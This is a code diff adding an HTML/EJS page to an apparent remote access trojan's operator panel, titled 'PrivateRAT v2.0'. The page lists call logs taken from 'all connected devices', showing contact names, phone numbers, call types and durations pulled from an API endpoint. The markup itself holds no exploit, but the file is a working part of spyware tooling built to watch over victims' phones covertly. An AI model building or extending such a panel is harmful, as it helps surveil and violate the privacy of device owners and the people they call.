@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Call Logs Monitoring - PrivateRAT v2.0</title>
+  <link rel="stylesheet" href="/css/semantic.min.css">
+  <link rel="stylesheet" href="/css/custom.css">
+  <link rel="stylesheet" href="/css/design-system.css">
+  <link rel="stylesheet" href="/css/sidebar.css">
+  <link rel="icon" href="/favicon.ico" type="image/x-icon">
+  <style>
+    .monitoring-container {
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+    }
+
+    .filter-section {
+      background: white;
+      border-radius: 16px;
+      padding: 24px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+    }
+
+    .filter-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 16px;
+    }
+
+    .data-table-container {
+      background: white;
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+    }
+
+    .table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+
+    .table thead {
+      background: #f7fafc;
+    }
+
+    .table th {
+      padding: 16px;
+      text-align: left;
+      font-weight: 600;
+      font-size: 13px;
+      color: #2d3748;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      border-bottom: 2px solid #e2e8f0;
+    }
+
+    .table td {
+      padding: 16px;
+      border-bottom: 1px solid #e2e8f0;
+      color: #4a5568;
+      font-size: 14px;
+    }
+
+    .table tbody tr:hover {
+      background: #f7fafc;
+    }
+
+    .table tbody tr:last-child td {
+      border-bottom: none;
+    }
+
+    .call-type {
+      padding: 4px 12px;
+      border-radius: 12px;
+      font-size: 11px;
+      font-weight: 600;
+      text-transform: uppercase;
+    }
+
+    .call-type.incoming {
+      background: rgba(72, 187, 120, 0.1);
+      color: #48bb78;
+    }
+
+    .call-type.outgoing {
+      background: rgba(66, 153, 225, 0.1);
+      color: #4299e1;
+    }
+
+    .call-type.missed {
+      background: rgba(229, 62, 62, 0.1);
+      color: #e53e3e;
+    }
+  </style>
+  <script src="/js/jquery-3.4.1.min.js"></script>
+  <script src="/js/semantic.min.js"></script>
+</head>
+<body>
+  <button class="mobile-toggle" onclick="toggleSidebar()">
+    <i class="bars icon"></i>
+  </button>
+
+  <div class="app-container">
+    <%- include('partials/sidebar.ejs', { activePage: 'calls' }) %>
+
+    <div class="main-content">
+      <div class="page-header">
+        <h1 class="page-title">Call Logs Monitoring</h1>
+        <p class="page-subtitle">Monitor call logs from all connected devices</p>
+      </div>
+
+      <div class="monitoring-container">
+        <div class="filter-section">
+          <div class="filter-grid">
+            <div class="form-group">
+              <label class="form-label">Search</label>
+              <input type="text" id="searchInput" class="form-input" placeholder="Search by Device ID or phone number...">
+            </div>
+            <div class="form-group">
+              <label class="form-label">Call Type</label>
+              <select id="callType" class="form-select">
+                <option value="">All Types</option>
+                <option value="incoming">Incoming</option>
+                <option value="outgoing">Outgoing</option>
+                <option value="missed">Missed</option>
+              </select>
+            </div>
+            <div class="form-group" style="display: flex; align-items: flex-end;">
+              <button class="btn btn-primary" onclick="refreshData()" style="width: 100%;">
+                <i class="refresh icon"></i> Refresh
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <div class="data-table-container">
+          <table class="table">
+            <thead>
+              <tr>
+                <th>Device ID</th>
+                <th>Contact Name</th>
+                <th>Phone Number</th>
+                <th>Type</th>
+                <th>Duration</th>
+                <th>Date & Time</th>
+              </tr>
+            </thead>
+            <tbody id="callsTableBody">
+              <tr>
+                <td colspan="6" class="text-center" style="padding: 40px; color: #718096;">
+                  <i class="phone icon" style="font-size: 48px; margin-bottom: 16px; display: block; color: #cbd5e0;"></i>
+                  No call logs found
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function toggleSidebar() {
+      const sidebar = document.getElementById('sidebar');
+      sidebar.classList.toggle('open');
+    }
+
+    document.addEventListener('click', function(event) {
+      const sidebar = document.getElementById('sidebar');
+      const mobileToggle = document.querySelector('.mobile-toggle');
+      if (window.innerWidth <= 768 && 
+          !sidebar.contains(event.target) && 
+          !mobileToggle.contains(event.target)) {
+        sidebar.classList.remove('open');
+      }
+    });
+
+    function formatDate(dateString) {
+      try {
+        return new Date(dateString).toLocaleString();
+      } catch {
+        return '-';
+      }
+    }
+    
+    function formatDuration(seconds) {
+        if (!seconds) return '0s';
+        const m = Math.floor(seconds / 60);
+        const s = seconds % 60;
+        return m > 0 ? `${m}m ${s}s` : `${s}s`;
+    }
+
+    async function refreshData() {
+      const tbody = document.getElementById('callsTableBody');
+      const searchInput = document.getElementById('searchInput').value.toLowerCase();
+      const callType = document.getElementById('callType').value;
+      
+      try {
+        const response = await fetch('/api/logs/calls');
+        const calls = await response.json();
+        
+        tbody.innerHTML = '';
+        
+        const filteredCalls = calls.filter(call => {
+            const matchSearch = !searchInput || 
+                (call.clientID && call.clientID.toLowerCase().includes(searchInput)) ||
+                (call.phoneNo && call.phoneNo.toLowerCase().includes(searchInput)) ||
+                (call.name && call.name.toLowerCase().includes(searchInput));
+                
+            const matchType = !callType || 
+                (call.type && call.type.toLowerCase() === callType.toLowerCase()) ||
+                (callType === 'incoming' && (call.type == '1' || call.type === 'incoming')) ||
+                (callType === 'outgoing' && (call.type == '2' || call.type === 'outgoing')) ||
+                (callType === 'missed' && (call.type == '3' || call.type === 'missed'));
+                
+            return matchSearch && matchType;
+        });
+
+        if (filteredCalls.length === 0) {
+           tbody.innerHTML = `
+              <tr>
+                <td colspan="6" class="text-center" style="padding: 40px; color: #718096;">
+                  <i class="phone icon" style="font-size: 48px; margin-bottom: 16px; display: block; color: #cbd5e0;"></i>
+                  No call logs found
+                </td>
+              </tr>
+           `;
+           return;
+        }
+
+        filteredCalls.forEach(call => {
+            const row = document.createElement('tr');
+            
+            let typeClass = '';
+            let typeName = call.type;
+            
+            // Map Android CallLog types
+            if (call.type == '1' || call.type === 'incoming') {
+                typeClass = 'incoming';
+                typeName = 'Incoming';
+            } else if (call.type == '2' || call.type === 'outgoing') {
+                typeClass = 'outgoing';
+                typeName = 'Outgoing';
+            } else if (call.type == '3' || call.type === 'missed') {
+                typeClass = 'missed';
+                typeName = 'Missed';
+            }
+            
+            row.innerHTML = `
+                <td>${call.clientID}</td>
+                <td>${call.name || 'Unknown'}</td>
+                <td>${call.phoneNo}</td>
+                <td><span class="call-type ${typeClass}">${typeName}</span></td>
+                <td>${formatDuration(call.duration)}</td>
+                <td>${formatDate(call.date)}</td>
+            `;
+            tbody.appendChild(row);
+        });
+      } catch (error) {
+        console.error('Error fetching calls:', error);
+      }
+    }
+
+    // Initial load
+    refreshData();
+
+    document.getElementById('searchInput').addEventListener('input', function() {
+      clearTimeout(this.searchTimeout);
+      this.searchTimeout = setTimeout(refreshData, 500);
+    });
+
+    document.getElementById('callType').addEventListener('change', refreshData);
+  </script>
+</body>
+</html>
